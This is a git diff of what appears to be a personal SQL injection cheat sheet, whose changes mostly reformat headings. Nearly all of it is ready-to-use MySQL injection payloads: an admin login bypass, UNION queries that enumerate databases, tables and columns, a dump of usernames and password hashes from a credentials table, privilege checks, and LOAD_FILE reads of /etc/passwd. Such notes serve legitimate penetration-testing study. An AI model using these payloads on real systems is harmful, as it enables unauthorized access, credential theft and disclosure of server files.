@@ -1,5 +1,5 @@
-# SELECT * FROM logins WHERE username='admin' AND password = '47bce5c74f589f4867dbd57e9ca9f808';
 
+SELECT * FROM logins WHERE username='admin' AND password = '47bce5c74f589f4867dbd57e9ca9f808';
 
 admin') or '1'='1'-- -
 
@@ -9,19 +9,19 @@ test' OR id = 5)-- -
 toma' OR id = 
 test' OR id = 4)-- -
 
-dump name databases
+# dump name databases
 
 UNION select 1,database(),2,3-- -
 
-dump databases;
+## dump databases;
 this command mysql dump all data;
 		UNION select 1,2,SCHEMA_NAME,4 FROM INFORMATION_SCHEMA.SCHEMATA-- - 
 		
 example:
 		UNION select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA-- -
-		DATABSES="information_schema,mysqL,performance_schema,ilfreight,dev"
+		DATABSES="information_schema,mysqL,performance_schema,backup,dev"
 
-dump tables
+## dump tables
 
 	' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='name_db'-- -
 
@@ -30,7 +30,7 @@ example
 	' union select 1,table_name,table_schema,4 from information_schema.tables where table_schema='dev'-- -
 	TABLES="framework,pages,credentials,posts"
 
-dump columns
+## dump columns
 
 	' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 
@@ -39,7 +39,7 @@ example
 
 COLUMNS="username,password"
 
-dump data
+## dump data
 
 	UNION select 1, username, password, 4 from dev.credentials-- -
 example :
@@ -54,11 +54,11 @@ software_engineer	3920aaaaadfsdf37dbba51f692776d6cefb6dd546d
 if want understand a lot information linke website mysql
 https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html
 
-Reading Files:
+## Reading Files:
 
 Privileges:eading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.
 
-DB User:
+## DB User:
 	SELECT USER()
 	SELECT CURRENT_USER()
 	SELECT user from mysql.user
@@ -67,7 +67,7 @@ command :
 		UNION SELECT 1, user(), 3, 4-- -
 		UNION SELECT 1, user, 3, 4 from mysql.user-- -
 
-User Privileges
+## User Privileges
 Now that we know our users, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
 
 SELECT super_priv FROM mysql.user
@@ -76,7 +76,7 @@ example:
 	
 		UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
 
-Notes:
+## Notes:
  		UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 		THis payload return in page ('Y') which means YES, indicating superuser privileges. We can also dump other privileges we have directly
 
@@ -90,7 +90,7 @@ return in page YES or Y
 all of the possible privileges given to our current user:
 
 
-LOAD_FILE:
+## LOAD_FILE:
 		SELECT LOAD_FILE('/etc/passwd');
 	example:
 	 	UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
